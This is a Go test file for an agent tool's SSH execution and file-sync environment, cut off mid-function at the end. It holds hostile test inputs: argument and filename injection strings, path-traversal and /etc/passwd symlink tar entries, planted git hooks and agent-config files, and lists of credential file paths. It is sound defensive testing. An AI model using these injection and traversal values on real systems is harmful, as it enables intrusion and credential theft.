package environment

import (
	"archive/tar"
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/FinanceNik/Freeloop/internal/environment/sshtest"
)

type hostGuard struct{ root string }

func (g hostGuard) CheckRead(p string) error { return nil }
func (g hostGuard) CheckWrite(p string) error {
	if strings.Contains(p, "/guarded/") {
		return fmt.Errorf("%w: %s", ErrProtected, p)
	}
	return nil
}

type sshRig struct {
	t      *testing.T
	sshd   sshtest.Server
	env    *SSH
	root   string
	notes  []string
	remote string
}

func newRig(t *testing.T, files map[string]string, change ...func(*SSHOptions)) *sshRig {
	t.Helper()
	d := sshtest.Start(t)
	root := filepath.Join(d.Dir, "project")
	os.MkdirAll(root, 0o755)
	for name, body := range files {
		p := filepath.Join(root, name)
		os.MkdirAll(filepath.Dir(p), 0o755)
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	r := &sshRig{t: t, sshd: d, root: root}
	remoteBase := filepath.Join(d.Dir, "remote")
	opts := SSHOptions{ID: "e", Host: "box", SessionID: "ses_1", Root: root, RemoteDir: remoteBase, ConfigFile: d.Config, Guard: hostGuard{},
		ListFiles: func(ctx context.Context) ([]string, error) {
			var out []string
			filepath.Walk(root, func(p string, fi os.FileInfo, err error) error {
				if err != nil {
					return nil
				}
				rel, _ := filepath.Rel(root, p)
				if rel != "." && (fi.Mode().IsRegular() || fi.Mode()&os.ModeSymlink != 0) {
					out = append(out, filepath.ToSlash(rel))
				}
				return nil
			})
			return out, nil
		},
		Notify: func(m string) { r.notes = append(r.notes, m) },
	}
	for _, c := range change {
		c(&opts)
	}
	env, err := NewSSH(opts)
	if err != nil {
		t.Fatal(err)
	}
	r.env = env
	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
	defer cancel()
	if _, err := env.Start(ctx); err != nil {
		t.Fatalf("Start: %v", err)
	}
	r.remote = filepath.Join(remoteBase, "freeloop-ses_1", "work")
	return r
}

func (r *sshRig) exec(command string) ExecResult {
	r.t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), time.Minute)
	defer cancel()
	res, err := r.env.Exec(ctx, ExecSpec{Command: command, Timeout: 30 * time.Second})
	if err != nil {
		r.t.Fatalf("Exec %q: %v", command, err)
	}
	return res
}

func (r *sshRig) local(name string) (string, bool) {
	b, err := os.ReadFile(filepath.Join(r.root, name))
	return string(b), err == nil
}

func (r *sshRig) said(part string) bool {
	return slices.ContainsFunc(r.notes, func(n string) bool { return strings.Contains(n, part) })
}

func TestSSHRunsThereAndSyncsBothWays(t *testing.T) {
	r := newRig(t, map[string]string{"a.txt": "one\n", "sub/b.txt": "two\n", "gone.txt": "x\n"})
	// A command runs in the working copy, not in the project, and sees its files.
	res := r.exec("pwd; cat a.txt sub/b.txt")
	if !strings.Contains(res.Output, "freeloop-ses_1/work") || !strings.Contains(res.Output, "one\ntwo") || res.ExitCode != 0 {
		t.Fatalf("exec: %+v", res)
	}
	if strings.Contains(res.Output, r.root) {
		t.Errorf("ran in the project: %s", res.Output)
	}
	if got := r.exec("exit 7"); got.ExitCode != 7 {
		t.Errorf("exit = %d", got.ExitCode)
	}
	// What a command makes, changes and deletes comes back.
	r.exec("echo made > new.txt; mkdir -p d/e; echo deep > d/e/f.txt; echo changed > a.txt; rm gone.txt")
	if s, _ := r.local("new.txt"); s != "made\n" {
		t.Errorf("new.txt = %q", s)
	}
	if s, _ := r.local("d/e/f.txt"); s != "deep\n" {
		t.Errorf("d/e/f.txt = %q", s)
	}
	if s, _ := r.local("a.txt"); s != "changed\n" {
		t.Errorf("a.txt = %q", s)
	}
	if _, ok := r.local("gone.txt"); ok {
		t.Error("gone.txt was not deleted here")
	}
	// What changes here reaches the next command, and a delete does too.
	os.WriteFile(filepath.Join(r.root, "a.txt"), []byte("edited here\n"), 0o644)
	os.Remove(filepath.Join(r.root, "new.txt"))
	if res := r.exec("cat a.txt; ls new.txt 2>&1 || echo missing"); !strings.Contains(res.Output, "edited here") || !strings.Contains(res.Output, "missing") {
		t.Errorf("after edits here: %s", res.Output)
	}
	if s, _ := r.local("a.txt"); s != "edited here\n" {
		t.Errorf("a.txt came back as %q", s)
	}
	// A path as a command printed it means the same file.
	if got := r.env.Resolve(r.remote + "/a.txt"); got != filepath.Join(r.root, "a.txt") {
		t.Errorf("Resolve = %s", got)
	}
	if res := r.exec("git log --oneline 2>/dev/null | wc -l"); res.ExitCode != 0 {
		t.Errorf("git: %+v", res)
	}
}

func TestSSHStdinAndCwdAndArgv(t *testing.T) {
	r := newRig(t, map[string]string{"sub/x.txt": "x\n"})
	ctx := context.Background()
	res, err := r.env.Exec(ctx, ExecSpec{Command: "cat; pwd", Stdin: []byte("from stdin\nsecond\n"), Cwd: "sub"})
	if err != nil || !strings.Contains(res.Output, "from stdin\nsecond") || !strings.HasSuffix(strings.TrimSpace(strings.Split(res.Output, "[Freeloop]")[0]), "work/sub") {
		t.Errorf("%+v %v", res, err)
	}
	res, err = r.env.Exec(ctx, ExecSpec{Argv: []string{"printf", "%s|", "a b", "$HOME", "it's", "`id`"}})
	if err != nil || !strings.Contains(res.Output, "a b|$HOME|it's|`id`|") {
		t.Errorf("argv was read by a shell: %+v %v", res, err)
	}
	if _, err := r.env.Exec(ctx, ExecSpec{Command: "true", Cwd: "/etc"}); err == nil {
		t.Error("ran in a folder outside the project")
	}
}

// A secret reaches the command and nothing else: no command line on either side, no
// file over there.
func TestSSHSecretsStayOffCommandLines(t *testing.T) {
	const secret = "s3cr3t-'value\"\nwith $(id) and `id`\n"
	r := newRig(t, map[string]string{"a": "a"}, func(o *SSHOptions) { o.Env = map[string]string{"MY_SECRET": secret} })
	res := r.exec(`printf '%s' "$MY_SECRET"; printf '\n--\n'; ps -axww -o command | grep -c 's3cr3t' ; grep -r s3cr3t "$HOME/.freeloop-none" 2>/dev/null; true`)
	if !strings.Contains(res.Output, secret) {
		t.Errorf("the value did not arrive whole: %q", res.Output)
	}
	base := filepath.Dir(r.remote)
	found := ""
	filepath.Walk(base, func(p string, fi os.FileInfo, err error) error {
		if err == nil && fi.Mode().IsRegular() {
			if b, _ := os.ReadFile(p); bytes.Contains(b, []byte("s3cr3t")) {
				found = p
			}
		}
		return nil
	})
	if found != "" {
		t.Errorf("the secret is in a file over there: %s", found)
	}
	argv := strings.Join(r.env.sshArgv(execScript, "s", "i", "1"), " ")
	if strings.Contains(argv, "s3cr3t") {
		t.Error("the secret is on the command line")
	}
}

// The command line wins over a config that loosens things.
func TestSSHRefusesWhatAConfigAllows(t *testing.T) {
	r := newRig(t, map[string]string{"a": "a"})
	r.exec("true")
	if _, err := os.Stat(filepath.Join(r.sshd.Dir, "local-command-ran")); err == nil {
		t.Error("a LocalCommand from the config ran on this computer")
	}
	res := r.exec(`echo "agent=[$SSH_AUTH_SOCK]"`)
	if !strings.Contains(res.Output, "agent=[]") {
		t.Errorf("an agent reached the other machine: %s", res.Output)
	}
	argv := r.env.sshArgv("true")
	for _, want := range []string{"StrictHostKeyChecking=yes", "BatchMode=yes", "ForwardAgent=no", "ClearAllForwardings=yes", "PermitLocalCommand=no", "UpdateHostKeys=no"} {
		if !slices.Contains(argv, want) {
			t.Errorf("missing %s", want)
		}
	}
	if argv[0] != "/usr/bin/ssh" {
		t.Errorf("ssh from %s", argv[0])
	}
	if i, j := slices.Index(argv, "--"), slices.Index(argv, "box"); i < 0 || j != i+1 {
		t.Errorf("the host does not follow --: %v", argv)
	}
}

func TestSSHNeverAcceptsAnUnknownHostKey(t *testing.T) {
	d := sshtest.Start(t)
	root := filepath.Join(d.Dir, "p")
	os.MkdirAll(root, 0o755)
	env, err := NewSSH(SSHOptions{Host: "unknownbox", SessionID: "s", Root: root, ConfigFile: d.Config, Guard: hostGuard{},
		ListFiles: func(context.Context) ([]string, error) { return nil, nil }})
	if err != nil {
		t.Fatal(err)
	}
	_, err = env.Start(context.Background())
	if err == nil || !strings.Contains(err.Error(), "host key") {
		t.Errorf("Start = %v", err)
	}
}

func TestSSHHostAndDirValidation(t *testing.T) {
	for _, bad := range []string{"", "-oProxyCommand=touch /tmp/x", "-v", "a b", "a;b", "a$(id)", "user@-x", "@host", "a\nb", "a`b`", "a'b"} {
		if ValidSSHHost(bad) {
			t.Errorf("host %q accepted", bad)
		}
	}
	for _, good := range []string{"box", "me@box.example.com", "10.0.0.1", "my-box_1"} {
		if !ValidSSHHost(good) {
			t.Errorf("host %q refused", good)
		}
	}
	for _, bad := range []string{"", "/", "~", "~/", "..", "a/../b", "../x", "-rf", "a b", "a;b", "$HOME", "a'b", "/tmp/$(id)", "a\nb", "*"} {
		if ValidRemoteDir(bad) {
			t.Errorf("dir %q accepted", bad)
		}
	}
	for _, good := range []string{".freeloop-sessions", "~/work/freeloop", "/srv/freeloop", "a/b.c"} {
		if !ValidRemoteDir(good) {
			t.Errorf("dir %q refused", good)
		}
	}
	if _, err := NewSSH(SSHOptions{Host: "box", SessionID: "../../etc", Root: t.TempDir(), Guard: hostGuard{}, ListFiles: func(context.Context) ([]string, error) { return nil, nil }}); err == nil {
		t.Error("a session ID that leaves the folder was accepted")
	}
}

// Secrets and what a deny rule covers stay here, tracked or not.
func TestSSHKeepsSecretsHere(t *testing.T) {
	r := newRig(t, map[string]string{
		"code.go": "x", ".env": "A=1", ".env.local": "B=2", ".env.example": "C=", "deploy/id_rsa": "k", "certs/site.pem": "p", ".npmrc": "t", "conf/.aws/credentials": "c", "denied/x.txt": "d",
		"CRED.PEM": "upper", ".git/config": "[remote]\nurl=https://token@host", ".freeloop/settings.yaml": "x",
	}, func(o *SSHOptions) { o.NoRead = func(rel string) bool { return strings.HasPrefix(rel, "denied/") } })
	for _, name := range []string{".env", ".env.local", "deploy/id_rsa", "certs/site.pem", ".npmrc", "conf/.aws/credentials", "denied/x.txt", "CRED.PEM", ".freeloop/settings.yaml"} {
		if _, err := os.Stat(filepath.Join(r.remote, name)); err == nil {
			t.Errorf("%s reached the other machine", name)
		}
	}
	if b, err := os.ReadFile(filepath.Join(r.remote, ".git", "config")); err == nil && bytes.Contains(b, []byte("token")) {
		t.Error("the project's git credentials reached the other machine")
	}
	for _, name := range []string{"code.go", ".env.example"} {
		if _, err := os.Stat(filepath.Join(r.remote, name)); err != nil {
			t.Errorf("%s did not arrive", name)
		}
	}
	if !r.said("looks like a secret") || !r.said("deny rule") {
		t.Errorf("not told: %v", r.notes)
	}
}

// What this computer would run or an agent would obey does not come back.
func TestSSHHoldsBackWhatWouldRunHere(t *testing.T) {
	r := newRig(t, map[string]string{"a.txt": "a", "AGENTS.md": "be good\n"}, func(o *SSHOptions) {
		o.NoWrite = func(rel string) bool { return strings.HasPrefix(rel, "locked/") }
	})
	r.exec(`mkdir -p .git/hooks .GIT/hooks .claude .CLAUDE .vscode .husky .freeloop sub/.claude locked
echo evil > .git/hooks/pre-commit
echo evil > .GIT/hooks/post-checkout
echo evil > .claude/settings.json
echo evil > .CLAUDE/settings.local.json
echo evil > sub/.claude/settings.json
echo evil > .vscode/tasks.json
echo evil > .husky/pre-commit
echo evil > .freeloop/settings.yaml
echo evil > .envrc
echo evil > .mcp.json
echo evil > AGENTS.md
echo evil > locked/x
echo evil > .env
echo fine > ok.txt`)
	for _, name := range []string{".git/hooks/pre-commit", ".GIT/hooks/post-checkout", ".claude/settings.json", ".CLAUDE/settings.local.json", "sub/.claude/settings.json", ".vscode/tasks.json", ".husky/pre-commit", ".freeloop/settings.yaml", ".envrc", ".mcp.json", "locked/x", ".env"} {
		if _, err := os.Stat(filepath.Join(r.root, name)); err == nil {
			t.Errorf("%s came back", name)
		}
	}
	if s, _ := r.local("AGENTS.md"); s != "be good\n" {
		t.Errorf("AGENTS.md became %q", s)
	}
	if s, _ := r.local("ok.txt"); s != "fine\n" {
		t.Errorf("ok.txt = %q", s)
	}
	if !r.said("Held back") {
		t.Errorf("not told: %v", r.notes)
	}
}

// Links made over there make nothing here, and a link here is not written through.
func TestSSHLinksDoNotCrossOrLead(t *testing.T) {
	outside := filepath.Join(t.TempDir(), "outside")
	os.MkdirAll(outside, 0o755)
	os.WriteFile(filepath.Join(outside, "keep.txt"), []byte("keep"), 0o644)
	r := newRig(t, map[string]string{"a.txt": "a"})
	r.exec(fmt.Sprintf(`ln -s %q linked; ln -s /etc/hosts hosts; echo x > a.txt`, outside))
	if fi, err := os.Lstat(filepath.Join(r.root, "linked")); err == nil {
		t.Errorf("a link came back: %v", fi.Mode())
	}
	if !r.said("Only regular files come back") {
		t.Errorf("not told: %v", r.notes)
	}
	// The project has a link of its own, and a file over there has the same path through it.
	os.Symlink(outside, filepath.Join(r.root, "mine"))
	r.exec(`rm -f linked; mkdir -p mine; echo evil > mine/keep.txt; echo evil > mine/new.txt`)
	if b, _ := os.ReadFile(filepath.Join(outside, "keep.txt")); string(b) != "keep" {
		t.Errorf("wrote through a link: %q", b)
	}
	if _, err := os.Stat(filepath.Join(outside, "new.txt")); err == nil {
		t.Error("created a file through a link")
	}
	// A link in the project is not sent as what it points to.
	os.WriteFile(filepath.Join(outside, "secret.txt"), []byte("secret"), 0o644)
	os.Symlink(filepath.Join(outside, "secret.txt"), filepath.Join(r.root, "points.txt"))
	if res := r.exec("cat points.txt 2>&1 || true"); strings.Contains(res.Output, "secret\n") || strings.HasPrefix(res.Output, "secret") {
		t.Errorf("a file outside the project was sent through a link: %s", res.Output)
	}
}

func TestSSHUsersEditsWin(t *testing.T) {
	r := newRig(t, map[string]string{"a.txt": "base\n", "b.txt": "base\n"})
	// Both sides change a.txt between the push and the pull: a command that edits it
	// while this computer does too.
	done := make(chan struct{})
	go func() {
		defer close(done)
		r.exec(`sleep 1; echo theirs > a.txt`)
	}()
	time.Sleep(400 * time.Millisecond)
	os.WriteFile(filepath.Join(r.root, "a.txt"), []byte("mine\n"), 0o644)
	<-done
	if s, _ := r.local("a.txt"); s != "mine\n" {
		t.Errorf("a.txt = %q", s)
	}
	if !r.said("Changed both here") {
		t.Errorf("not told: %v", r.notes)
	}
	if res := r.exec("cat a.txt"); !strings.Contains(res.Output, "mine") {
		t.Errorf("the edit here did not replace it: %s", res.Output)
	}
}

func TestSSHMassDeleteIsNotApplied(t *testing.T) {
	files := map[string]string{}
	for i := range 40 {
		files[fmt.Sprintf("f%d.txt", i)] = "x"
	}
	r := newRig(t, files)
	r.exec("rm -f f*.txt")
	if _, ok := r.local("f1.txt"); !ok {
		t.Error("a mass delete emptied the project")
	}
	if !r.said("was not applied") {
		t.Errorf("not told: %v", r.notes)
	}
	if res := r.exec("ls | wc -l"); !strings.Contains(res.Output, "40") {
		t.Errorf("the files did not go back: %s", res.Output)
	}
}

func TestSSHTimeoutEndsTheCommandThere(t *testing.T) {
	r := newRig(t, map[string]string{"a": "a"})
	marker := filepath.Join(r.sshd.Dir, "still-running")
	ctx, cancel := context.WithCancel(context.Background())
	go func() {
		time.Sleep(800 * time.Millisecond)
		cancel()
	}()
	r.env.Exec(ctx, ExecSpec{Command: fmt.Sprintf(`(sleep 3; touch %q) & sleep 30`, marker), Timeout: 60 * time.Second})
	time.Sleep(3500 * time.Millisecond)
	if _, err := os.Stat(marker); err == nil {
		t.Error("the command kept running there after it was stopped")
	}
}

// A hostile sender, whatever it sends: only the regular files asked for are applied.
func TestApplyTarTakesOnlyWhatWasAskedFor(t *testing.T) {
	outsideDir := t.TempDir()
	root := t.TempDir()
	root, _ = filepath.EvalSymlinks(root)
	os.WriteFile(filepath.Join(root, "existing.txt"), []byte("base"), 0o644)
	var notes []string
	env, err := NewSSH(SSHOptions{Host: "box", SessionID: "s", Root: root, Guard: hostGuard{}, ListFiles: func(context.Context) ([]string, error) { return nil, nil },
		Notify: func(m string) { notes = append(notes, m) }})
	if err != nil {
		t.Fatal(err)
	}
	env.baseline["existing.txt"] = hashOf([]byte("base"))
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	entry := func(h tar.Header, body string) {
		h.Size = int64(len(body))
		if h.Mode == 0 {
			h.Mode = 0o644
		}
		if err := tw.WriteHeader(&h); err != nil {
			t.Fatal(err)
		}
		tw.Write([]byte(body))
	}
	escape := filepath.Join(outsideDir, "pwned")
	rel, _ := filepath.Rel(root, escape)
	entry(tar.Header{Typeflag: tar.TypeReg, Name: "../../../../../etc/pwned"}, "evil")
	entry(tar.Header{Typeflag: tar.TypeReg, Name: rel}, "evil")
	entry(tar.Header{Typeflag: tar.TypeReg, Name: escape}, "evil")
	entry(tar.Header{Typeflag: tar.TypeReg, Name: ".git/hooks/pre-commit"}, "evil")
	entry(tar.Header{Typeflag: tar.TypeReg, Name: "not-asked.txt"}, "evil")
	entry(tar.Header{Typeflag: tar.TypeSymlink, Name: "./wanted-link", Linkname: "/etc/passwd"}, "")
	entry(tar.Header{Typeflag: tar.TypeLink, Name: "./wanted-hard", Linkname: "/etc/passwd"}, "")
	entry(tar.Header{Typeflag: tar.TypeChar, Name: "./wanted-dev", Devmajor: 1, Devminor: 3}, "")
	entry(tar.Header{Typeflag: tar.TypeFifo, Name: "./wanted-fifo"}, "")
	entry(tar.Header{Typeflag: tar.TypeReg, Name: "./ok.txt", Mode: 0o4777}, "good")
	entry(tar.Header{Typeflag: tar.TypeReg, Name: "./ok.txt"}, "second time")
	entry(tar.Header{Typeflag: tar.TypeReg, Name: "./guarded/x"}, "evil")
	tw.Close()
	wanted := map[string]bool{"ok.txt": true, "wanted-link": true, "wanted-hard": true, "wanted-dev": true, "wanted-fifo": true, "guarded/x": true}
	out, err := env.applyTar(&buf, wanted)
	if err != nil {
		t.Fatal(err)
	}
	if b, _ := os.ReadFile(filepath.Join(root, "ok.txt")); string(b) != "good" {
		t.Errorf("ok.txt = %q", b)
	}
	fi, err := os.Lstat(filepath.Join(root, "ok.txt"))
	if err != nil || fi.Mode().Perm()&0o111 != 0 || fi.Mode()&(os.ModeSetuid|os.ModeSetgid) != 0 {
		t.Errorf("ok.txt mode = %v, %v", fi, err)
	}
	for _, name := range []string{"not-asked.txt", "wanted-link", "wanted-hard", "wanted-dev", "wanted-fifo", ".git", "guarded"} {
		if _, err := os.Lstat(filepath.Join(root, name)); err == nil {
			t.Errorf("%s was made", name)
		}
	}
	if _, err := os.Stat(escape); err == nil {
		t.Error("a file was written outside the project")
	}
	if !strings.Contains(strings.Join(out, " "), "not asked for") {
		t.Errorf("not told of what it sent: %v", out)
	}
}

// Sizes hold against a sender that lies or floods.
func TestApplyTarLimits(t *testing.T) {
	root, _ := filepath.EvalSymlinks(t.TempDir())
	env, _ := NewSSH(SSHOptions{Host: "box", SessionID: "s", Root: root, Guard: hostGuard{}, ListFiles: func(context.Context) ([]string, error) { return nil, nil }})
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	tw.WriteHeader(&tar.Header{Typeflag: tar.TypeReg, Name: "./big", Mode: 0o644, Size: maxSyncFile + 1})
	out, err := env.applyTar(&buf, map[string]bool{"big": true})
	// Cut short here, so an error is right too; either way it is not written.
	_ = out
	_ = err
	if _, err := os.Stat(filepath.Join(root, "big")); err == nil {
		t.Error("an oversized file was written")
	}
	if _, err := env.applyTar(strings.NewReader("this is not a tar stream at all, and it goes on for a bit longer than one might expect, past the five hundred and twelve bytes of a header"+strings.Repeat("x", 600)), map[string]bool{"a": true}); err == nil {
		t.Error("garbage was taken for a stream")
	}
}

func TestValidSyncPath(t *testing.T) {
	for _, bad := range []string{"", "/etc/passwd", "../x", "a/../b", "a//b", "./a", "a/.", "a\\b", "a\nb", "a\x00b", "a\x1b[31mb", "a‮b", "a​b", "\xff\xfe", strings.Repeat("a", 256), "a/"} {
		if validSyncPath(bad) {
			t.Errorf("%q accepted", bad)
		}
	}
	for _, good := range []string{"a", "a/b.txt", ".env.example", "ünï/çödé.txt", "with space.txt", "-rf"} {
		if !validSyncPath(good) {
			t.Errorf("%q refused", good)
		}
	}
}

func TestHeldAndSecretPaths(t *testing.T) {
	for _, p := range []string{"sub/HEAD", "HEAD", "x/head", ".github/workflows/ci.yml", ".GITHUB/a", ".yarnrc.yml", "a/.pnpmfile.cjs", ".cargo/config.toml", ".git/config", ".GIT/hooks/x", "sub/.git/config", ".claude/settings.json", ".CLAUDE/x", ".vscode/tasks.json", ".envrc", "sub/.envrc", ".mcp.json", "AGENTS.md", "agents.MD", "sub/CLAUDE.md", ".Git/CONFIG", ".claude", "ſ/.git/x"} {
		if !heldPath(p) {
			t.Errorf("%q not held", p)
		}
	}
	for _, p := range []string{"src/main.go", "git/config", "claude/x", "README.md", "envrc", "agents.md.bak"} {
		if heldPath(p) {
			t.Errorf("%q held", p)
		}
	}
	for _, p := range []string{".env", ".ENV", "a/.env.prod", "id_rsa", "x/id_ed25519.pub", "a.pem", "A.PEM", ".ssh/config", "b/.aws/config", "secrets.yaml", ".netrc"} {
		if !secretPath(p) {
			t.Errorf("%q not a secret", p)
		}
	}
	for _, p := range []string{"src/env.go", ".env.example", "keys.go", "readme.md", "environment/a"} {
		if secretPath(p) {
			t.Errorf("%q taken for a secret", p)
		}
	}
}

// A folder over there that is a link is not used: a copy with --delete-like tidying
// must not run somewhere else.
func TestSSHRefusesALinkedSessionFolder(t *testing.T) {
	d := sshtest.Start(t)
	root := filepath.Join(d.Dir, "p")
	os.MkdirAll(root, 0o755)
	base := filepath.Join(d.Dir, "rb")
	os.MkdirAll(base, 0o755)
	os.MkdirAll(filepath.Join(d.Dir, "elsewhere"), 0o755)
	os.Symlink(filepath.Join(d.Dir, "elsewhere"), filepath.Join(base, "freeloop-s"))
	env, err := NewSSH(SSHOptions{Host: "box", SessionID: "s", Root: root, RemoteDir: base, ConfigFile: d.Config, Guard: hostGuard{},
		ListFiles: func(context.Context) ([]string, error) { return nil, nil }})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := env.Start(context.Background()); err == nil {
		t.Error("used a session folder that is a link")
	}
}

func TestRemoveSSHCopyRemovesOnlyTheSession(t *testing.T) {
	r := newRig(t, map[string]string{"a": "a"})
	base := filepath.Dir(filepath.Dir(r.remote))
	other := filepath.Join(base, "freeloop-other")
	os.MkdirAll(other, 0o755)
	opts := r.env.opts
	if err := RemoveSSHCopy(context.Background(), opts); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(base, "freeloop-ses_1")); err == nil {
		t.Error("the session's folder is still there")
	}
	if _, err := os.Stat(other); err != nil {
		t.Error("another folder went with it")
	}
}

// A machine that never stops sending cannot hold this up or fill memory.
func TestSSHFloodIsCutOff(t *testing.T) {
	r := newRig(t, map[string]string{"a": "a"})
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	start := time.Now()
	if _, err := r.env.readRemote(ctx, 1<<20, nil, `exec yes flood`); err == nil {
		t.Error("an endless list was taken")
	}
	err := r.env.streamRemote(ctx, nil, func(rd io.Reader) error {
		_, err := io.CopyN(io.Discard, rd, 1024)
		return err
	}, `exec yes flood`)
	if err == nil || !strings.Contains(err.Error(), "kept sending") {
		t.Errorf("after its end, a flood: %v", err)
	}
	if time.Since(start) > 20*time.Second {
		t.Errorf("took %v", time.Since(start))
	}
}

// Names are data, whatever a command made them.
func TestSSHStrangeNamesStayThere(t *testing.T) {
	r := newRig(t, map[string]string{"a": "a"})
	r.exec(`touch "$(printf 'new\nline.txt')" "$(printf 'esc\033[31m.txt')" '$(touch pwned).txt' ';touch pwned2;.txt' -- '-rf'; echo fine > 'with space.txt'`)
	for _, name := range []string{"new\nline.txt", "esc\x1b[31m.txt", "pwned", "pwned2"} {
		if _, err := os.Lstat(filepath.Join(r.root, name)); err == nil {
			t.Errorf("%q came back", name)
		}
	}
	if s, _ := r.local("with space.txt"); s != "fine\n" {
		t.Errorf("an ordinary name with a space: %q", s)
	}
	// The ones a shell would have acted on are ordinary files, and nothing ran.
	if _, err := os.Lstat(filepath.Join(r.remote, "pwned")); err == nil {
		t.Error("a name was run by a shell over there")
	}
	if !r.said("because of their names") {
		t.Errorf("not told: %v", r.notes)
	}
}

// Sessions on one machine have a connection each, so one ending leaves the other's.
func TestSSHSessionsDoNotShareAConnection(t *testing.T) {
	root := t.TempDir()
	opts := SSHOptions{Host: "box", SessionID: "one", Root: root, ControlDir: "/tmp/x", Guard: hostGuard{}, ListFiles: func(context.Context) ([]string, error) { return nil, nil }}
	one, _ := NewSSH(opts)
	opts.SessionID = "two"
	two, _ := NewSSH(opts)
	path := func(s *SSH) string {
		for _, a := range s.sshArgv("true") {
			if strings.HasPrefix(a, "ControlPath=") {
				return a
			}
		}
		return ""
	}
	if path(one) == "" || path(one) == path(two) {
		t.Errorf("control paths: %q %q", path(one), path(two))
	}
}

// Local-only mode coming on stops what a running session does next.
func TestSSHAllowedIsAskedEachTime(t *testing.T) {
	var refuse atomic.Bool
	r := newRig(t, map[string]string{"a": "a"}, func(o *SSHOptions) {
		o.Allowed = func() error {
			if refuse.Load() {
				return errors.New("local-only")
			}
			return nil
		}
	})
	r.exec("true")
	refuse.Store(true)
	if _, err := r.env.Exec(context.Background(), ExecSpec{Command: "touch ran"}); err == nil {
		t.Error("ran after it was refused")
	}
	if _, err := os.Stat(filepath.Join(r.remote, "ran")); err == nil {
		t.Error("the command reached the machine")
	}
}

// Review, 2026-11-04: a path under a folder named ~ was read as the home folder.
func TestSSHTildeIsNotHome(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	os.WriteFile(filepath.Join(home, ".zsh_history"), []byte("my-history-secret"), 0o644)
	r := newRig(t, map[string]string{"~/.zsh_history": "placeholder", "a.txt": "a"})
	found := ""
	filepath.Walk(filepath.Dir(r.remote), func(p string, fi os.FileInfo, err error) error {
		if err == nil && fi.Mode().IsRegular() {
			if b, _ := os.ReadFile(p); bytes.Contains(b, []byte("my-history-secret")) {
				found = p
			}
		}
		return nil
	})
	if found != "" {
		t.Errorf("a file of the home folder reached the other machine: %s", found)
	}
	if _, err := os.Stat(filepath.Join(r.remote, "~")); err == nil {
		t.Error("a folder named ~ was sent")
	}
	// Nor can one come back to it.
	r.exec(`mkdir -p './~'; echo evil > './~/.zshenv'`)
	if _, err := os.Stat(filepath.Join(home, ".zshenv")); err == nil {
		t.Error("wrote to the home folder")
	}
	if b, _ := os.ReadFile(filepath.Join(r.root, "~", ".zshenv")); len(b) > 0 {
		t.Errorf("came back: %q", b)
	}
}

// Review: rules that cannot be read let everything through. Now they bring nothing back.
func TestSSHNoIgnoreRulesNothingComesBack(t *testing.T) {
	var fail atomic.Bool
	r := newRig(t, map[string]string{"a.txt": "a"}, func(o *SSHOptions) {
		o.Ignored = func(context.Context, []string) ([]string, error) {
			if fail.Load() {
				return nil, errors.New("git died")
			}
			return nil, nil
		}
	})
	fail.Store(true)
	res := r.exec("echo x > new.txt; echo changed > a.txt")
	if _, ok := r.local("new.txt"); ok {
		t.Error("a file came back with no ignore rules to judge it")
	}
	if s, _ := r.local("a.txt"); s != "a" {
		t.Errorf("a.txt = %q", s)
	}
	if !strings.Contains(res.Output, "could not be brought back") {
		t.Errorf("the failure was not said: %s", res.Output)
	}
}

// Review: an emptied .gitignore over there sent every ignored file on the next sync.
func TestSSHIgnoreRulesDoNotChangeFromThere(t *testing.T) {
	r := newRig(t, map[string]string{".gitignore": "prod.tfvars\n", "a.txt": "a"})
	r.exec(": > .gitignore; echo '!x' > sub.gitignore; mkdir -p d; echo x > d/.gitignore; echo y > .gitattributes")
	if s, _ := r.local(".gitignore"); s != "prod.tfvars\n" {
		t.Errorf(".gitignore became %q", s)
	}
	for _, name := range []string{"d/.gitignore", ".gitattributes"} {
		if _, ok := r.local(name); ok {
			t.Errorf("%s came back", name)
		}
	}
}

// Review: names the permission policy already knows, and more that run by themselves.
func TestSSHHoldsWhatRunsOnOrdinaryUse(t *testing.T) {
	r := newRig(t, map[string]string{"a": "a"}, func(o *SSHOptions) { o.ActedOn = []string{".my-tool", "tool.lua"} })
	r.exec(`mkdir -p .agents/skills/x .windsurf .continue .zed .my-tool .venv/lib node_modules/x sub/venv/lib
for f in .agents/skills/x/SKILL.md opencode.json .nvim.lua .nvimrc .exrc .windsurf/a .continue/a .zed/a .my-tool/a tool.lua .venv/lib/evil.pth node_modules/x/index.js sub/venv/lib/evil.pth .lfsconfig .bazelrc gradle.properties .pylintrc; do echo evil > "$f"; done`)
	for _, name := range []string{".agents/skills/x/SKILL.md", "opencode.json", ".nvim.lua", ".nvimrc", ".exrc", ".windsurf/a", ".continue/a", ".zed/a", ".my-tool/a", "tool.lua", ".venv/lib/evil.pth", "node_modules/x/index.js", "sub/venv/lib/evil.pth", ".lfsconfig", ".bazelrc", "gradle.properties", ".pylintrc"} {
		if _, ok := r.local(name); ok {
			t.Errorf("%s came back", name)
		}
	}
}

// Review: an executable script here was replaced and stayed executable.
func TestSSHExecutableIsNotReplacedOrMade(t *testing.T) {
	r := newRig(t, map[string]string{"build.sh": "#!/bin/sh\necho mine\n", "plain.txt": "p"})
	os.Chmod(filepath.Join(r.root, "build.sh"), 0o755)
	r.exec("true")
	res := r.exec("echo evil > build.sh; echo fresh > fresh.sh; chmod +x fresh.sh; chmod +x plain.txt")
	if s, _ := r.local("build.sh"); !strings.Contains(s, "mine") {
		t.Errorf("an executable here was replaced: %q", s)
	}
	if !strings.Contains(res.Output, "executable") {
		t.Errorf("not said: %s", res.Output)
	}
	if fi, err := os.Stat(filepath.Join(r.root, "fresh.sh")); err != nil || fi.Mode().Perm()&0o111 != 0 {
		t.Errorf("fresh.sh: %v %v", fi, err)
	}
	if fi, _ := os.Stat(filepath.Join(r.root, "plain.txt")); fi.Mode().Perm()&0o111 != 0 {
		t.Error("plain.txt became executable")
	}
}

// Review: settings and widely named secrets were sent.
func TestSSHDoesNotSendSettings(t *testing.T) {
